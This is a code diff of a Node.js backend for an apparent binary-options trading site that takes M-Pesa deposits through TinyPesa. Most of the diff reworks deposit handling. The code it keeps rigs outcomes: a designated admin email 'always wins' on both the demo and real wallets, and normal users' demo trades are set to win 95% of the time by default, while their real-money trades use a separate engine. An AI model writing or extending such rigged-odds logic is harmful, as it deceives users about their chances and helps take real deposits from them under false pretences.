@@ -1,7 +1,7 @@
-/* VANTA backend v6 · admin simulation + demo-wallet simulation · TinyPesa (STK + link fallback)
-   Env: MONGO_URI, JWT_SECRET, TINYPESA_API_KEY, TINYPESA_LINK,
-        MPESA_CB_SECRET, ADMIN_EMAIL (this account always wins, both wallets)
-   Optional: DEMO_WIN_RATE (0-1, default 0.95) — win rate for normal users' DEMO trades
+/* VANTA backend v6 · admin simulation + demo-wallet simulation · TinyPesa STK Push (API only)
+   Env: MONGO_URI, JWT_SECRET, TINYPESA_API_KEY (LINK API key from dashboard),
+        MPESA_CB_SECRET, ADMIN_EMAIL
+   Optional: DEMO_WIN_RATE (0-1, default 0.95)
    Verify: /version → {"v":"6.0-admin-sim"} */
 const express=require('express'),cors=require('cors'),mongoose=require('mongoose'),
       jwt=require('jsonwebtoken'),bcrypt=require('bcryptjs');
@@ -18,13 +18,11 @@ const isSimUser=u=>!!(ADMIN_EMAIL&&u&&String(u.email||'').trim().toLowerCase()==
 const withSim=(j,u)=>{j.sim=isSimUser(u);return j};
 
 /* ── TinyPesa config ──
-   Webhook (set in TinyPesa dashboard, per link): 
-   https://vanta-1-7q8l.onrender.com/mpesa/callback/<MPESA_CB_SECRET>
-   TINYPESA_LINK = your public payment link, e.g. https://tinypesa.com/vantabinary2 */
+   Webhook (TinyPesa dashboard → link settings → Primary Webhook):
+   https://vanta-1-7q8l.onrender.com/mpesa/callback/<MPESA_CB_SECRET> */
 const TINYPESA={
   BASE:(process.env.TINYPESA_BASE||'https://tinypesa.com/api/v1').replace(/\/+$/,''),
   KEY:(process.env.TINYPESA_API_KEY||'').trim(),
-  LINK:(process.env.TINYPESA_LINK||'https://tinypesa.com/vantabinary2').trim(),
 };
 async function readJson(r,label){
   const txt=await r.text();
@@ -32,7 +30,7 @@ async function readJson(r,label){
   catch{throw new Error(label+' returned HTTP '+r.status+' non-JSON: '+txt.slice(0,120))}
 }
 async function stkPush(amount,phone,ref='Payment'){
-  if(!TINYPESA.KEY)throw new Error('TINYPESA_API_KEY not configured (check Render env)');
+  if(!TINYPESA.KEY)throw new Error('TINYPESA_API_KEY not configured (use the LINK API key from the TinyPesa dashboard)');
   const msisdn=normPhone(phone);
   if(!/^254[17]\d{8}$/.test(msisdn))throw new Error('Invalid Kenyan number: '+msisdn);
   const r=await fetch(TINYPESA.BASE+'/express/initiate',{method:'POST',
@@ -195,9 +193,7 @@ app.get('/trades/sync',auth,h(async(req,res)=>{
   const now=Date.now();
   const due=await Trade.find({user:req.uid,status:'open',expiry:{$lte:now}});
   for(const t of due){
-    /* sim if: stored flag (admin, any wallet) OR demo wallet (normal users) */
     const sim=(t.sim===true)||t.account==='demo';
-    /* admin → always win; normal demo → DEMO_WIN_RATE; real non-admin → real engine */
     const wantWin=sim&&(t.account==='demo'?Math.random()<DEMO_WIN_RATE:true);
     try{
       if(t.kind==='digits'){
@@ -266,7 +262,7 @@ app.get('/trades',auth,h(async(req,res)=>{
   res.json(t.map(pub));
 }));
 
-/* ── deposits ── */
+/* ── deposits (STK Push only — no redirect) ── */
 app.post('/deposits',auth,h(async(req,res)=>{
   const method=req.body.method,amt=r2(+req.body.amount);
   if(method!=='mpesa')
@@ -279,21 +275,20 @@ app.post('/deposits',auth,h(async(req,res)=>{
     bonus=r2(amt*rates[code]);}
   const total=r2(amt+bonus);
   const phone=normPhone(req.body.phone);
-  if(!/^254(7|1)\d{8}$/.test(phone)){
-    return res.status(400).json({message:'Enter a valid Safaricom number, e.g. 0712 345 678'});}
+  if(!/^254(7|1)\d{8}$/.test(phone))
+    return res.status(400).json({message:'Enter a valid Safaricom number, e.g. 0712 345 678'});
   const kes=Math.ceil(amt*KES_PER_USD);
-  const instructions={phone,network:'M-Pesa · TinyPesa',kesAmount:kes,
-    payLink:TINYPESA.LINK,
-    note:'Tap the link, enter KES '+kes+', complete the M-Pesa prompt'};
   const d=await Tx.create({user:req.uid,type:'deposit',method,amount:amt,bonus,total,
-    bonusCode:code||null,status:'awaiting_payment',time:Date.now(),instructions});
+    bonusCode:code||null,status:'awaiting_payment',time:Date.now(),
+    instructions:{phone,network:'M-Pesa · STK Push',kesAmount:kes}});
   try{
     const j=await stkPush(kes,phone,'VNT'+String(d._id).slice(-8).toUpperCase());
-    d.checkoutId=j.request_id; /* STK works → auto prompt sent */
+    d.checkoutId=j.request_id;await d.save();
   }catch(e){
-    console.error('STK failed, link fallback:',e.message); /* deposit stays valid via payLink */
+    console.error('STK initiate failed:',e.message);
+    d.status='failed';await d.save();
+    return res.status(502).json({message:'M-Pesa error: '+e.message});
   }
-  await d.save();
   res.json(pub(d));
 }));
 app.get('/deposits/:id',auth,h(async(req,res)=>{
@@ -317,22 +312,12 @@ app.post('/mpesa/callback/:secret',async(req,res)=>{
     if(!paid)return;
     const expected=Math.ceil(d.amount*KES_PER_USD);
     d.paidAt=Date.now();
-    d.mpesaReceipt=tx.receipt||req.body.MpesaReceiptNumber||req.body.Code||'';
+    d.mpesaReceipt=tx.receipt||req.body.MpesaReceiptNumber||'';
     d.status='confirmed';d.confirmedAt=Date.now();
     await credit(d.user,'real',paid>=expected?d.total:r2(paid/KES_PER_USD));
     await d.save();
   }catch(e){console.error('mpesa callback:',e.message)}
 });
-app.post('/deposits/:id/confirm',auth,h(async(req,res)=>{
-  const d=await Tx.findOne({_id:req.params.id,user:req.uid,type:'deposit'});
-  if(!d)return res.status(404).json({message:'Deposit not found'});
-  if(d.status==='confirmed')return res.json(pub(d));
-  if(!d.paidAt)
-    return res.status(402).json({message:'Payment not detected yet'});
-  d.status='confirmed';d.confirmedAt=Date.now();
-  await credit(req.uid,'real',d.total);await d.save();
-  res.json(pub(d));
-}));
 
 /* ── withdrawals ── */
 app.post('/withdrawals',auth,h(async(req,res)=>{
